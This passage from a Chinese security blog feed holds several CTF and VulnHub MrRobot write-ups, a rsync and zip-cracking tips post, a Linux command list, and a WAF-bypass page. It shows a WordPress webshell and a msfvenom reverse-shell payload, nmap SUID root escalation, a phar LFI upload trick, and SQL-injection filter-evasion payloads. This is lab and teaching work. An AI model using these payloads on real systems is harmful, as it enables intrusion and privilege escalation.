class="string">"9"</span>);</div><div class="line">  $str = <span class="string">''</span>;</div><div class="line"></div><div class="line">  <span class="keyword">for</span> ($i = <span class="number">1</span>; $i &lt;= $length; ++$i) &#123;</div><div class="line">    $ch = mt_rand(<span class="number">0</span>, count($set) - <span class="number">1</span>);</div><div class="line">    $str .= $set[$ch];</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  <span class="keyword">return</span> $str;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">echo</span> random_str().<span class="string">"\n\r"</span>;</div></pre></td></tr></table></figure>
<h3 id="具体实现步骤"><a href="#具体实现步骤" class="headerlink" title="具体实现步骤"></a>具体实现步骤</h3><p>观察之后发现我们如果有文件名，我们可以通过将木马压缩进zip包，然后上传该zip文件(改成Png后缀上传)，利用phar伪协议包含执行命令。 所以我们的核心就是搞到文件名，即想办法搞到$seed。 这里我将一句话写进0.php，压缩之后改名为0.png上传 然后至于这里的session_id()，我们通过设置Cookie: PHPSESSID=;就能让它为空，所以得到随机数的md5，解开后的值为78503716<br><img src="http://ofrdce5qv.bkt.clouddn.com/QQ%E5%9B%BE%E7%89%8720170321211752.png" alt=""><br><img src="http://ofrdce5qv.bkt.clouddn.com/QQ%E5%9B%BE%E7%89%8720170321212919.png" alt=""><br>生成文件名的前一部分为YQO4DMVYN25oxMabf9t5UBKnngcPQf2y，加上我们上传的0.png,所以完整的文件路径利用exp为/uP1O4Ds/YQO4DMVYN25oxMabf9t5UBKnngcPQf2y_0.png，然后访问 <a href="http://218.2.197.235:23735/?page=phar://uP1O4Ds/YQO4DMVYN25oxMabf9t5UBKnngcPQf2y_0.png/0，最后执行命令即可拿到flag。" target="_blank" rel="external">http://218.2.197.235:23735/?page=phar://uP1O4Ds/YQO4DMVYN25oxMabf9t5UBKnngcPQf2y_0.png/0，最后执行命令即可拿到flag。</a> 如下：<br><img src="http://ofrdce5qv.bkt.clouddn.com/QQ%E5%9B%BE%E7%89%8720170321213638.png" alt=""></p>
<p>###参考链接<br><a href="http://bendawang.site/article/NJCTF-2017-web-Writeup" target="_blank" rel="external">http://bendawang.site/article/NJCTF-2017-web-Writeup</a></p>
<blockquote>
<p><a href="http://www.cnblogs.com/iamstudy/articles/2017_NJCTF_Some_Web_Writeup.html" target="_blank" rel="external">http://www.cnblogs.com/iamstudy/articles/2017_NJCTF_Some_Web_Writeup.html</a></p>
<p><a href="http://wonderkun.cc/index.html/?p=585" target="_blank" rel="external">http://wonderkun.cc/index.html/?p=585</a></p>
</blockquote>
]]></content>
      
        
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[文件包含-phar LFI]]></title>
      <url>http://yoursite.com/2017/03/14/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-phar-LFI/</url>
      <content type="html"><![CDATA[<p>###0x01 什么是phar文件<br>phar文件是一个文件归档包，类似于Java中的Jar文件，方便PHP模块的迁移。php中默认安装了这个模块；</p>
<p>简言之，Phar就是把java界的jar概念迁移到了PHP界，Phar可以将一组PHP文件进行打包，还可以创建默认执行stub，同时Phar可以选择是否进行压缩；</p>
<p>###0x02 创建一个phar文件<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"></div></pre></td></tr></table></figure></p>
]]></content>
      
        
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[攻破MrRobot-黑客技能训练]]></title>
      <url>http://yoursite.com/2016/12/02/%E6%94%BB%E7%A0%B4MrRobot-%E9%BB%91%E5%AE%A2%E6%8A%80%E8%83%BD%E8%AE%AD%E7%BB%83/</url>
      <content type="html"><![CDATA[<p><a href="https://download.vulnhub.com/mrrobot/mrRobot.ova" target="_blank" rel="external">MrRobot下载链接</a></p>
<h3 id="准备阶段"><a href="#准备阶段" class="headerlink" title="准备阶段"></a>准备阶段</h3><h4 id="第一步：找到靶机的ip地址，寄出神器nmap"><a href="#第一步：找到靶机的ip地址，寄出神器nmap" class="headerlink" title="第一步：找到靶机的ip地址，寄出神器nmap"></a>第一步：找到靶机的ip地址，寄出神器nmap</h4><p>开始一直找不到靶机的地址，解决方法，桥接模式且复制物理网络连接状态，重启之后就扫到了<br><img src="http://i1.piimg.com/567571/98f19b9342d67c3e.png" alt=""></p>
<p><img src="http://i1.piimg.com/567571/80535c965880082b.png" alt=""></p>
<h4 id="第二步：打开靶机"><a href="#第二步：打开靶机" class="headerlink" title="第二步：打开靶机"></a>第二步：打开靶机</h4><p><img src="http://ofrdce5qv.bkt.clouddn.com/0f49b2c6de5d84ee.png" alt=""><br><a id="more"></a></p>
<h4 id="第三步：扫描开放的端口"><a href="#第三步：扫描开放的端口" class="headerlink" title="第三步：扫描开放的端口"></a>第三步：扫描开放的端口</h4><p><img src="http://ofrdce5qv.bkt.clouddn.com/2a391542fb78878b.png" alt=""></p>
<h4 id="第四步：利用nikto扫描一下网站"><a href="#第四步：利用nikto扫描一下网站" class="headerlink" title="第四步：利用nikto扫描一下网站"></a>第四步：利用nikto扫描一下网站</h4><p>Nikto是一款开放源代码，功能强大的WEB扫描评估软件，能对服务器多种安全项目进行测试的扫描工具，去寻找已知有名的漏洞；</p>
<p>利用nitko命令可以帮助我们收集像文件信息和其他的主要的信息，渗透之前我们不需了解我们的目标</p>
<ul>
<li>nitko -h 192.168.0.163<br><img src="http://i1.piimg.com/567571/4737661d4c4f78d1.png" alt=""><br>我们很快的得到这是一个wordpress的站<h3 id="注射过程"><a href="#注射过程" class="headerlink" title="注射过程"></a>注射过程</h3></li>
</ul>
<h4 id="前戏"><a href="#前戏" class="headerlink" title="前戏"></a>前戏</h4><p>Ctrl+u查看网站源代码，不过貌似并没有什么卵用，<code>var USER_IP=&#39;208.185.115.6</code>查看另一个ip地址，大概是调用了这个ip地址的js或其它的文件<br><img src="http://p1.bpimg.com/567571/70d82a35997f11fd.png" alt=""><br>根据前面收集到的信息，有robots.txt文件，进行拿站的常规思路，收获了一点点信息<br><img src="http://p1.bpimg.com/567571/20cbb3281410f3e9.png" alt=""><br>根据robots.txt收集到的信息，得到第一个flag<br><img src="http://i1.piimg.com/567571/1e8bc148e8b5b4bf.png" alt=""><br>访问<a href="http://192.168.0.163/fsocity.dic，得到了一个字典文件，给我的第一直觉就是网站后台的爆破" target="_blank" rel="external">http://192.168.0.163/fsocity.dic，得到了一个字典文件，给我的第一直觉就是网站后台的爆破</a><br><img src="http://p1.bqimg.com/567571/e88bf075db7aac99.png" alt=""></p>
<h4 id="渗透之旅"><a href="#渗透之旅" class="headerlink" title="渗透之旅"></a>渗透之旅</h4><p>根据之前利用nitko扫描到的信息，可以知道网站的后台是/wp-login.php这也是wordpress默认后台的地址</p>
<p>得到了密码字典，紧接着一个问题又跟来了，用户名是什么，继续搞，没有思路了，蓝瘦香菇，突然翻到前面的时候，灵光一闪<br><img src="http://i1.piimg.com/567571/ce5d15f7ecccb946.png" alt=""><br>接着搞起来，然而/fuction,/join等都是找不到页面不应该呀，先把字典下载<br><img src="http://i1.piimg.com/567571/92a5656a736a9994.png" alt=""><br>还是没有思路，明明给了提示咋还是搞不定，原来是自己傻了，明明页面就给了命令端，而自己傻了吧唧的往url上面输，自己笨怪谁呀</p>
<p>接下来我尝试命令<code>inform</code>,展现在眼前的是一个hactivism类型的宣传<br><img src="http://p1.bqimg.com/567571/345dab3f5206037b.jpg" alt=""><br>大约读了读也没有找到可以说没有找到什么有用的信息，当我输入命令<code>question</code>,又是令我费解的产生了几张图片，直觉给我，这里面是充满故事的<br><img src="http://i1.piimg.com/567571/eb93df3c0574e5c8.jpg" alt=""><br>当我试图去搜索<code>executive everyone steals that&#39;s how it works</code>，从google中得到了一个有用的信息，似乎和这道题有关系<code>https://www.tvfanatic.com/quotes/shows/mr-robot/episodes/hellofriendmov/</code>,其中有一个人名Elliot，抱着尝试的态度<br><img src="http://p1.bpimg.com/567571/21d088fd2082f6bb.png" alt=""><br>看到这个错误提醒我知道，用户名正确了，因为之前尝试admin等直接给出的是用户名错误，用户名有了，剩下的就只有利用wpscan来爆破用户名登陆了；<br><img src="http://i1.piimg.com/567571/eda7aaf6237548ed.png" alt=""><br><code>wpscan --url 192.168.0.163 --threads 20--wordlist /root/Desktop/fsocity.dic --username Elliot</code></p>
<pre><code>--threads参数：设置线程
--wordlist参数：设置字典文件的路径
--username参数：设置wordpress的用户名
</code></pre><p>然后就可以顺利登陆进来了<br><img src="http://i1.piimg.com/567571/2efc542d0edf179d.png" alt=""><br>剩下的就是利用wordpress的版本找漏洞了，这里有两个思路，一个就是利用<code>msfvenom</code>生成木马提权，第二个就是利用wordpress版本曝出的漏洞来进行提权渗透</p>
<h4 id="方法一：利用kali中的msfvenm"><a href="#方法一：利用kali中的msfvenm" class="headerlink" title="方法一：利用kali中的msfvenm"></a>方法一：利用kali中的msfvenm</h4><p>msfvenom是一个独立于Metasploit框架之上的后门生成工具，它是原有旧版的msfpayload和msfencode的集合。新版的Metasploit Framework已经没有这两个工具。</p>
<p>常用的参数：</p>
<ul>
<li>-p：需要使用的攻击载荷</li>
<li>-f：输出载荷的格式，可以使用–help-formates列出所有可用格式</li>
<li>-o:指定输出位置</li>
<li>lhost：payload参数，指定反向连接服务端地址</li>
<li>lport：payload参数，指定反向链接服务端端口</li>
<li>-k：配置攻击载荷在独立的线程中启动，不影响宿主程序的运行</li>
<li>查看所有linux可用的payload：msfvenom -l payloads| grep linu</li>
</ul>
<p>生成payload:<code>msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.0.107 lport=1234 -f raw</code><br><img src="http://i1.piimg.com/567571/6fff28dc84860828.png" alt=""><br>复制代码从&lt;php die();到wordpress后台模板并保存<br><img src="http://i1.piimg.com/567571/036db0bce07bc6db.png" alt=""><br>接下来就是注射阶段了</p>
<pre><code>Use exploit/multi/handler

set payload php/meterpreter/reverse_tcp

set lhost 192.168.0.107

set lport 4444

exploit
</code></pre><p><img src="http://i1.piimg.com/567571/8575b3bf1079ba55.png" alt=""><br>一旦执行了漏洞，现在需要的就是在浏览器中访问后门文件<code>http://192.168.0.163/wp-content/themes/twentyfifteen/404.php</code><br><img src="http://i1.piimg.com/567571/0e6f9a81fbbb4e2e.png" alt=""><br>成功了，结果还是可喜的<br><img src="http://i1.piimg.com/567571/1e75756ec4bb4e92.png" alt=""><br>这样就可以轻松获取一个webshell了，接下来就是进入目标用户，并可以知道所有的用户类型信息</p>
<pre><code>ls -lsa (获取用户详细的信息)

cd home 

ls -lsa 

cd robot 
</code></pre><p><img src="http://p1.bpimg.com/567571/fc216e55db9427fa.png" alt=""></p>
<p><img src="http://p1.bpimg.com/567571/00be7e9d8960091c.png" alt=""><br>成功了三分之二了，剩下的一关又找不到头绪，但是之前做程序员游戏那个每个信息都是有用的，眼前这个password.raw-md5觉得可以动动脑筋，思路是不会错的,做到后面我才知道，其实我并没有到第二关，看过程<br><img src="http://p1.bqimg.com/567571/8008d2b4066470ab.png" alt=""><br>其中前面的MD5解密后的结果就是下面的密码，我服<br><img src="http://p1.bqimg.com/567571/c66edf66bfcd8e1c.png" alt=""></p>
<p>下面这个就是技巧，干货，利用nmap形成一个interactive shell<br><img src="http://p1.bqimg.com/567571/eaf382603ed7c04d.png" alt=""></p>
<pre><code>nmap 

nmap –interactive（用户能够通过该选项执行shell命令，通常，安全人员会使用该命令来避免他们使用nmap命令被记录在history文件中）

!sh（nmap有SUID位，故可以通过“!sh”我们会获取到一个root权限的shell，其含义就是代码由bash shell解释）

id 

cd /root 
</code></pre><p><img src="http://i1.piimg.com/567571/69e055a6f232cfe6.png" alt=""></p>
<h4 id="补充之后又get到的用户名密码"><a href="#补充之后又get到的用户名密码" class="headerlink" title="补充之后又get到的用户名密码"></a>补充之后又get到的用户名密码</h4><p>利用sort命令，它可以帮我们依据不同的数据类型进行排序，-n参数是依照熟知的大小排序<br><img src="http://p1.bqimg.com/567571/e064d2932259b513.png" alt=""><br><img src="http://p1.bqimg.com/567571/40bffdba8eff811f.png" alt=""></p>
<h4 id="方法二：利用wordpress版本漏洞getshell"><a href="#方法二：利用wordpress版本漏洞getshell" class="headerlink" title="方法二：利用wordpress版本漏洞getshell"></a>方法二：利用wordpress版本漏洞getshell</h4><p>经过goole在github找到一个wordpress-shell，链接<a href="https://github.com/leonjza/wordpress-shell" target="_blank" rel="external">wordpress-shell</a></p>
<p>过程：<br><img src="http://p1.bpimg.com/567571/e44ed1c058292763.png" alt=""><br>接着访问<code>http://192.168.0.163/wp-content/plugins/shell/shell.php</code><br>根据readme，访问<code>http://192.168.0.163/wp-content/plugins/shell/shell.php?cmd=id</code><br>这个思路没有搞定，现在直接尝试一句话</p>
<p>利用思路二，从插件，已安装的插件，编辑，插入一句话木马，相对地址<code>/wp-content/plugins/</code><br><img src="http://p1.bqimg.com/567571/c3515f7123cd4ff8.png" alt=""><br>shell相对地址/wp-content/plugins/all-in-one-seo-pack/all_in_one_seo_pack.php</p>
<p>菜刀连接:<br><img src="http://p1.bpimg.com/567571/a8d9c05824ac8ea4.png" alt=""><br>翻目录看到<br><img src="http://p1.bpimg.com/567571/c47bbcc0e70bdb39.png" alt=""><br>说明我们这个只是apache用户的权限，robot用户的部分权限。<br><img src="http://p1.bpimg.com/567571/5ee01b34e66c2707.png" alt=""><br>其实方法一我们就可以在知道，下载下来里面的内容是<code>ERROR:// Can Not Read</code>,但是password.raw-md5可以下载，Notepad++打开，可以看到那段密码，这个过程省略</p>
<p>最后就是在webshell执行以下脚本<a href="http://pan.baidu.com/s/1boGz8CJ" target="_blank" rel="external">百度云-密码7k6j</a><br><img src="http://p1.bqimg.com/567571/1bbff7ee5634d833.png" alt=""><br>将数据转发至本机，先反弹回来一个半交互的shell<br><img src="http://p1.bqimg.com/567571/8269ae5f111988d4.png" alt=""><br>由于权限低，利用代码<code>python -c &#39;import pty; pty.spawn(&quot;/bin/sh&quot;)&#39;</code>获取一个完整的交互式shell</p>
<p><img src="http://p1.bqimg.com/567571/27ab589c8dea3753.png" alt=""></p>
<p>接下来的提权过程和上面就大同小异啦</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>难点就在第三关的提权环节，这一点要回归到Linux文件权限的问题。在Linux中除了文件的基本权限-rwxrwxrwx，还有就是文件的特殊权限，就是SUID和SGID以及SBIT，大致说一下他们的含义</p>
<ul>
<li>SUID含义：SUID shell是一种可用于以拥有者权限运行的shell。也就是说，如果拥有者是root，那你就可能以root的</li>
<li>SGID含义：对文件而言是以文件所属身份执行，而更重要的是对目录的权限</li>
<li>SBIT含义：要求操作系统既是在可执行程序退出后，仍要在内存中保留该程序的映像，这样做是为了节省大型程序的启动时间，但是会占用系统资源</li>
</ul>
<p>所以我们利用SUID的权限漏洞，利用命令<code>find / -perm -u=s -type f 2&gt;/dev/null</code>查找所有用户有SUID权限的文件。<br><img src="http://i1.piimg.com/567571/458762f03a7ea2a1.png" alt=""><br>通过列出的目录发现了nmap，低版本的nmap支持“interactive.”选项，用户能够通过该选项执行shell命令，通常，安全人员会使用该命令来避免他们使用nmap命令被记录在history文件中，通过nmap就可以拿到交互的shell，因为nmap有SUID位，所以通过<code>!sh</code>就会获取到一个root权限的shell。</p>
<p><code>最后强调一点，学习nc等，首先要懂socket通信，归根就是网络</code></p>
]]></content>
      
        
        <tags>
            
            <tag> 渗透测试 CTF </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[模拟渗透测试get到的技巧]]></title>
      <url>http://yoursite.com/2016/11/30/%E6%A8%A1%E6%8B%9F%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95get%E5%88%B0%E7%9A%84%E6%8A%80%E5%B7%A7/</url>
      <content type="html"><![CDATA[<h3 id="一-nmap使用技巧"><a href="#一-nmap使用技巧" class="headerlink" title="一 nmap使用技巧"></a>一 nmap使用技巧</h3><p>当针对入口点IP地址进行端口扫描，将其所开放的端口号（仅扫描小于1000的端口），由于在CMD测试，禁止ping，则需要使用到-Pn参数</p>
<p><img src="http://i1.piimg.com/567571/e0a7c3b304ab996b.png" alt=""><br>-vv参数表示输出详细报告结果，-p指定端口扫描，-Pn为扫描前不进行ping操作，如果网站禁止了ping，扫描时不加Pn扫不出开放端口</p>
<h3 id="二-Rsync漏洞"><a href="#二-Rsync漏洞" class="headerlink" title="二 Rsync漏洞"></a>二 Rsync漏洞</h3><p>Rsync,remote synchroniz顾名思义就知道它是一款实现远程同步功能的软件，它在同步文件的同时可以保持原来文件的权限，时间，软硬链接等附加信息。它是用 “rsync 算法”提供了一个客户机和远程文件服务器的文件同步的快速方法，并可以通过ssh方式来传输文件，这样其保密性也非常好，另外还是免费软件。<br><a id="more"></a></p>
<p>Rsync默认的端口是873，可以使用nmap扫描哪些ip开放了873端口</p>
<pre><code>nmap -n --open -p 873 x.x.x.x/24
</code></pre><p>找到开放的873端口后，连接能否查看模块名</p>
<pre><code>rsync x.x.x.x::
</code></pre><p>若可以，就尝试上传，下载文件试一下</p>
<p>rsync中有时候存在未授权访问<br><img src="http://i1.piimg.com/567571/f07696c2386a3cf1.png" alt=""><br>rsync 172.16.1.110::  <code>rsync链接</code></p>
<p>rsync 172.16.1.110::www/ <code>列出这个目录下的文件</code></p>
<p>rsync 172.16.1.110::www/flag02 <code>把flag02下载保存到本地root目录</code></p>
<h3 id="三-利用kali-fcrackzip对zip密码压缩文件暴力破解"><a href="#三-利用kali-fcrackzip对zip密码压缩文件暴力破解" class="headerlink" title="三 利用kali fcrackzip对zip密码压缩文件暴力破解"></a>三 利用kali fcrackzip对zip密码压缩文件暴力破解</h3><p>若在ctf比赛中没有现成的zip爆破工具，则可以利用kali中的fcrackzip工具<br><img src="http://p1.bpimg.com/567571/4ec62df6e6d25924.png" alt=""></p>
<pre><code>fcrackzip -b -v -u -c a -l 1-6 1.zip 
 -b参数：指定暴力枚举
 -v参数:显示破解信息
 -u参数：进行解压测试以排除错误密码
 -c参数：指定字符集
 -c a指定的字符集为纯小写字母
 -l参数：指定密码长度
</code></pre>]]></content>
      
        
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Linux常用命令使用总结]]></title>
      <url>http://yoursite.com/2016/11/17/Linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/</url>
      <content type="html"><![CDATA[<h3 id="1-strings命令"><a href="#1-strings命令" class="headerlink" title="1 strings命令"></a>1 strings命令</h3><p>strings命令在对象文件或二进制文件中查找可打印的字符串。字符串是4个或更多可打印的任意序列，以换行符或空字符结束。strings命令对识别随机对象文件很有用。</p>
<p>语法：</p>
<ul>
<li><p>strings [-a] [-] [-o] [-t Format] [-n Number] [file…]</p>
<a id="more"></a>
<p>   -a –all:扫描整个文件而不是只扫描目标文件初始化和装载段<br>   -：设置显示的最少的字符数，默认是4个字符<br>   -t –radix={o,d,x}:输出字符的位置，基于八进制，十进制还是十六进制<br>   -o:类似–radix=0</p>
<p>  列出ls中所有的ASCII文本：<br>  strings /bin/ls<br>  列出ls中所有的ASCII文本：<br>   cat /bin/ls strings<br>  查找ls中包含libc的字符串，不区分大小写：<br>   strings /bin/ls | grep -i libc</p>
</li>
</ul>
<h3 id="2-grep命令"><a href="#2-grep命令" class="headerlink" title="2 grep命令"></a>2 grep命令</h3><p>grep命令是一个强大的文本搜索工具，它能使用正则表达式搜索文本，并把匹配的行打印出来</p>
<p>常用的参数：</p>
<pre><code>-i：忽略大小写的差别
-c：计算符合样式的列数
-n：在显示符合样式的那一行之前，标识出该行的列数编号
-f：指定规则的文本
</code></pre><h3 id="3-mv命令"><a href="#3-mv命令" class="headerlink" title="3 mv命令"></a>3 mv命令</h3><p>mv命令用来对文件或目录重新命名，或者将文件从一个文件移到另一个目录。source表示源文件或目录，target表示目标文件或目录。如果将一个文件移动到另一个已经存在的文件中，则目标文件的内容将会被覆盖。</p>
<p>注意：</p>
<ul>
<li>mv与cp的结果不同，mv好像文件的”搬家”，文件个数并未增加。而cp对文件进行复制，文件个数增加了。</li>
</ul>
<h3 id="4-foremost命令"><a href="#4-foremost命令" class="headerlink" title="4 foremost命令"></a>4 foremost命令</h3><p>foremost是一个根据文件头和内部数据恢复文件的一个工具，在ctf比赛中也比较有用</p>
<ul>
<li>foremost是一个基于文件头和尾部信息以及文件的内建数据恢复文件的命令行工具</li>
</ul>
<p>安装foremost后你可以使用foremost -help查看使用帮助，这里最简单分离文件的命令为：</p>
<pre><code>foremost carter.jpg
</code></pre><h3 id="5-convert命令"><a href="#5-convert命令" class="headerlink" title="5 convert命令"></a>5 convert命令</h3><p>convert是linux下的图片处理工具，在一些ctf比赛的隐写中较常用</p>
<pre><code>convert +append a.gif b.png
b.png是拼接好的图片，意思是将gif图片转换为png
 +append代表是横向拼接
 -append代表是纵向拼接
</code></pre><h3 id="6-unzip命令"><a href="#6-unzip命令" class="headerlink" title="6 unzip命令"></a>6 unzip命令</h3><p>unzip命令用于解压缩由zip命令压缩的<code>.zip</code>压缩包<br>常用的参数：</p>
<ul>
<li><p>-d&lt;目录&gt;：指定文件解压缩后所要存储的目录 </p>
<h3 id="7-tcpdump命令"><a href="#7-tcpdump命令" class="headerlink" title="7 tcpdump命令"></a>7 tcpdump命令</h3><p>tcpdump是一个用于解读网络分组，并输出分组内容的工具。tcpdump凭强大的功能和灵活的截取策略，使其成为<br>类UNXI系统下用于网络分析和问题排查的首选工具</p>
<p>   -w，如果你要将监听所得的数据包数据储存下来，用这个参数就对了。后面接文件名<br>   -O 不运行分组分组匹配（packet-matching）代码优化程序<br>   -s 从每个分组中读取最开始的snaplen个字节，而不是默认的68个字节。 </p>
<h3 id="8-tcpick"><a href="#8-tcpick" class="headerlink" title="8 tcpick"></a>8 tcpick</h3><p>tcpick是一款基于文本的嗅探器，能追踪，重组和重排tcp流</p>
<h3 id="9-WPSCAN"><a href="#9-WPSCAN" class="headerlink" title="9 WPSCAN"></a>9 WPSCAN</h3><p>wpscan是一款针对wordpress的安全扫描软件，可以扫描出wordpress的版本，主题，插件，后台用户以及爆破后台密码等。</p>
<h3 id="10-wc命令"><a href="#10-wc命令" class="headerlink" title="10 wc命令"></a>10 wc命令</h3><p>wc命令的功能为统计指定文件中的字节数，字数，行数，并将统计结果显示输出</p>
</li>
</ul>
<p>常用到的参数：</p>
<pre><code> -c参数：统计字节数
 -l参数：统计行数
 -w参数：统计字数
wc -w flag.dic
</code></pre><h3 id="11-arp-scan命令"><a href="#11-arp-scan命令" class="headerlink" title="11 arp-scan命令"></a>11 arp-scan命令</h3><p>扫描局域网IP地址</p>
<ul>
<li><p>arp-scan -l：查看网段所有的主机</p>
<h3 id="12-sort命令"><a href="#12-sort命令" class="headerlink" title="12 sort命令"></a>12 sort命令</h3><p>sort是一个很有用的命令，它可以帮助我们排序，而且可以根据不同的数据类型进行排序</p>
<p>   -f  ：忽略大小写的差异，例如 A 与 a 视为编码相同；<br>   -b  ：忽略最前面的空格符部分；<br>   -n  ：使用『纯数字』进行排序(默认是以文字型态来排序的)；<br>   -r  ：反向排序；<br>   -u  ：就是 uniq ，相同的数据中，仅出现一行代表；<br>   -t  ：分隔符，默认是用 [tab] 键来分隔；<br>   -k  ：以那个区间 (field) 来进行排序的意思<br>  使用：sort -u fsocity.dic &gt; sorted.txt</p>
<h3 id="13-id命令"><a href="#13-id命令" class="headerlink" title="13 id命令"></a>13 id命令</h3><p>id命令可以显示真实有效的用户ID（UID）和用户ID（GID）。UID是对一个用户的单一身份表示。组ID则对应多个UID。id命令已经默认预装在大多数的Linux系统中。要使用它，只需要你在控制台输入id。</p>
</li>
</ul>
<p>当我们想知道某个用户的UID和GID时，id命令是非常有用的。一些程序可能需要UID/GID来运行。id使我们更容易地找出用户UID以及GID而不必再/etc/group文件中查找</p>
<p><img src="http://ofrdce5qv.bkt.clouddn.com/QQ%E5%9B%BE%E7%89%8720161206113349.png" alt=""><br>解释：<br>``用户ubuntu的UID号码=1000，GID号码=1000<br>语法：</p>
<p><code>id [-gGnru][--help][--version][用户名称]</code><br>选项：</p>
<pre><code>-g或--group 　 显示用户所属群组的ID。 
-G或--groups 显示用户所属附加群组的ID。 
-n或--name 　 显示用户，所属群组或附加群组的名称。 
-r或--real 　 显示实际ID。 
-u或--user 　 显示用户ID。
</code></pre><h3 id="13-find命令"><a href="#13-find命令" class="headerlink" title="13 find命令"></a>13 find命令</h3><p>find命令用来在指定目录下查找文件。任何位于参数之前的字符串都将视为欲查找的的目录名。如果使用该命令时，不设置任何参数，则find命令将在当前目录下查找子目录与文件。</p>
<p>以下列举平时常用到的：</p>
<p><code>find / -type 类型参数</code></p>
<ul>
<li>f：普通文件</li>
<li>l：符号连接</li>
<li>d：目录</li>
</ul>
<p>根据文件权限/所有权进行匹配<br>当前目录下搜索出权限为777的文件<code>find . -type f -perm 777</code></p>
<p>找出当前目录用户tom拥有的所有文件<code>find . -type f -user tome</code></p>
<h3 id="14-在Linux文件中权限的问题"><a href="#14-在Linux文件中权限的问题" class="headerlink" title="14 在Linux文件中权限的问题"></a>14 在Linux文件中权限的问题</h3><p><code>r(Read，读取)：对文件而言，具有读取文件内容的权限；对目录来说，具有浏览目 录的权限。</code><br><code>w(Write,写入)：对文件而言，具有新增、修改文件内容的权限；对目录来说，具有删除、移动目录内文件的权限。</code><br><code>x(eXecute，执行)：对文件而言，具有执行文件的权限；对目录了来说该用户具有进入目录的权限。</code><br><code>s或S（SUID）：可执行的稳健搭配这个权限，便能得到特权，任意存取改文件的所有者能使用全部系统资源</code></p>
]]></content>
      
        
        <tags>
            
            <tag> linux </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[渗透绕WAF的方法]]></title>
      <url>http://yoursite.com/2016/11/15/%E6%B8%97%E9%80%8F%E7%BB%95WAF%E7%9A%84%E6%96%B9%E6%B3%95/</url>
      <content type="html"><![CDATA[<h3 id="基本-简单绕过方法"><a href="#基本-简单绕过方法" class="headerlink" title="基本/简单绕过方法"></a>基本/简单绕过方法</h3><h4 id="1-注释符"><a href="#1-注释符" class="headerlink" title="1.注释符"></a>1.注释符</h4><pre><code>http://www.xxx.com/index.php?page_id=-1 /*!UNION*/ /*!SELECT*/ 1,2,3,4…
</code></pre><h4 id="2-使用大小写"><a href="#2-使用大小写" class="headerlink" title="2.使用大小写"></a>2.使用大小写</h4><pre><code>http://www.xxx.com/index.php?page_id=-1 uNIoN SeLEct 1,2,3,4…
</code></pre><h4 id="3-结合前面两种方法"><a href="#3-结合前面两种方法" class="headerlink" title="3.结合前面两种方法"></a>3.结合前面两种方法</h4><pre><code>http://www.xxx.com/index.php?page_id=-1 /*!unIOn*//*!SelECT*/ 1,2,3..
</code></pre><h4 id="4-关键字替换"><a href="#4-关键字替换" class="headerlink" title="4.关键字替换"></a>4.关键字替换</h4><pre><code>http://www.xxx.com/index.php?page_id=-1 UNIunionON SELselectECT 1,2,3,4…
适用于一些会把union select替换掉的WAF
</code></pre><a id="more"></a>
<h4 id="5-内部注释"><a href="#5-内部注释" class="headerlink" title="5.内部注释"></a>5.内部注释</h4><pre><code>http://www.xxx.com/index.php?page_id=-1 %55nION/**/%53ElecT 1,2,3,4…
U替换为%55，S替换为%53 在 union 和 select 之间添加注释/**/
</code></pre><h3 id="高级绕过方法"><a href="#高级绕过方法" class="headerlink" title="高级绕过方法"></a>高级绕过方法</h3><h4 id="1-使用其他变量或者命令对注入语句进行替换"><a href="#1-使用其他变量或者命令对注入语句进行替换" class="headerlink" title="1.使用其他变量或者命令对注入语句进行替换"></a>1.使用其他变量或者命令对注入语句进行替换</h4><pre><code>group_concat() | concat_ws()
@@version | version()
concat() | concat_ws()
COMMAND | WHAT TO USE INSTEAD
</code></pre><h4 id="2-对字母进行编码"><a href="#2-对字母进行编码" class="headerlink" title="2.对字母进行编码"></a>2.对字母进行编码</h4><pre><code>http://www.xxx.com/index.php?page_id=-1 /*!u%6eion*/ /*!se%6cect*/ 1,2,3,4….
</code></pre><h4 id="3-利用WAF本身的功能绕过"><a href="#3-利用WAF本身的功能绕过" class="headerlink" title="3.利用WAF本身的功能绕过"></a>3.利用WAF本身的功能绕过</h4><p>若发现WAF会把”*”替换为空，则可以利用这一特性来绕过</p>
<pre><code>http://www.xxx.com/index.php?page_id=-1+un*ion+se*lect+1,2,3..
其它方法：-15+(uNioN)+(sElECt)….-15+(uNioN+SeleCT)+…-15+(UnI)(oN)+(SeL)(ecT)+….-15+union (select 1,2,3,4…)‍
</code></pre><h4 id="4-缓冲区溢出使防火墙崩溃"><a href="#4-缓冲区溢出使防火墙崩溃" class="headerlink" title="4.缓冲区溢出使防火墙崩溃"></a>4.缓冲区溢出使防火墙崩溃</h4><p>大部分防火墙都是基于c/c++开发，故可以使用缓冲区溢出使WAF崩溃</p>
<pre><code>http://www.xxx.com/index.php?page_id=-1+and+(select1)=(Select 0xAA[..(add about 1000 &quot;A&quot;)..])+/*!uNIOn*/+/*!SeLECt*/+1,2,3,4
使用如下方法测试WAF
?page_id=null%0A/**//*!50000%55nIOn*//*yoyu*/all/**/%0A/*!%53eLEct*/%0A/*nnaa*/+1,2,3,4
</code></pre>]]></content>
      
        
        <tags>
            
            <tag> 渗透技巧 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[docker学习]]></title>
      <url>http://yoursite.com/2016/11/10/docker%E5%AD%A6%E4%B9%A0/</url>
      <content type="html"><![CDATA[<h3 id="Docker简介"><a href="#Docker简介" class="headerlink" title="Docker简介"></a>Docker简介</h3><p>什么是容器？</p>
<pre><code>一种虚拟化的方案
操作系统级别的虚拟化
